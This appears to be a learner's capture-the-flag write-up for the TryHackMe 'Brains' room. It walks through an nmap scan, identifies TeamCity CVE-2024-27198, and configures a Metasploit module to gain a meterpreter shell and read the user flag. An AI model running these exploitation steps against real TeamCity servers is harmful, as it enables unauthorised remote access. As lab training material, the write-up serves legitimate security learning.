
# Brains Task 1

This is my first write-up for the TryHackMe room Brains. I’ll walk through the steps I used to get the user flag, explain my thought process, and include commands and screenshots so you can reproduce the steps. Hope this helps — and feel free to DM me if anything’s unclear! :)



## Disclaimer
This write-up is for educational purposes only.

It is intended to document my personal learning experience while working through the TryHackMe room. All information provided is meant to help others understand the techniques and concepts involved in ethical hacking and cybersecurity.

I do not condone or promote any form of illegal activity.

Always ensure you have proper authorization before testing or accessing any system. Hacking without permission is illegal and unethical.

## Scanning Network
First, I run an Nmap scan to discover open services:

`nmap -sC -A IP`

![Nmap Scan](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/nmap-scan.png)

The scan shows ports 22, 80, and 50000 are open.



## Checking open ports
### port 80
I opened the web service on port `80` (HTTP) to see what’s running:


![Port 80](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/port-80.png)

The page shows a maintenance message and the source contains nothing useful, so I moved on to other services.

### port 50000
Visiting port 50000 shows a login.html page (looks like TeamCity):

![Port 50000](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/port-50000.png)

Here we can see login.html.
We can try bruteforce creditentals bur first lets take look at TeamCity vesrion
![TeamCity version](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/version.png)


A quick web search for that version shows at least two public CVEs affecting it:
![TeamCity version](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/search.png)



CVE-2024-27198

CVE-2024-27199


## Getting `flag.txt` with Metasploit
let's start `msfconsole` and search for CVE-2024-27198
![Search resoults](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/msf-search.png)
We can se there is exploit for that CVE. So let's try it.

Fisrt we type `use 0` and then look at requirements with `options`

![Selecting exploit](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/options.png)

Here we can see reqired settings so let's set them:

`set rhosts [IP]` - RHOST is Target's IP

`set rport 50000` - RPORT is port of login page where TeamCity is located

`set targeturi http://[IP]:50000/` - TARGETURI is base path to TeamCity

Because we are using THM VPN we have to change listening IP with tun0 It will be shwon with `ipconfig`

`set LHOST [tun0 IP]`

Once again we run `option` to make sure everything is setted up

![run exploit](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/run.png)

If everything is good we type `run` and wait for exploit to do it's thing until we see `meterpreter >`

![yay](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/meterpreter.png)

Yay! We are in now as instuctions says `flag.txt` should be loacated in user's home directory so let's check

Just use `cd ..` and `ls` until we see `home` directory

![yay](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/cdls.png)

Then `cd` into ubuntu and type `ls`

![yay](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/cdcd.png)

And there is our `flag.txt`

now just use `cat flag.txt` and paste into task one !

![yay](https://raw.githubusercontent.com/D3ad-Byt3/THM-WriteUps/main/Brains/images/flagg.png)




## Thank you

Thank you for reading through this write-up.  
This was my first attempt at documenting a TryHackMe room, and I hope it provided a clear and helpful walkthrough.  
Any feedback or suggestions for improvement are always welcome.



**Author:** D3adByt3
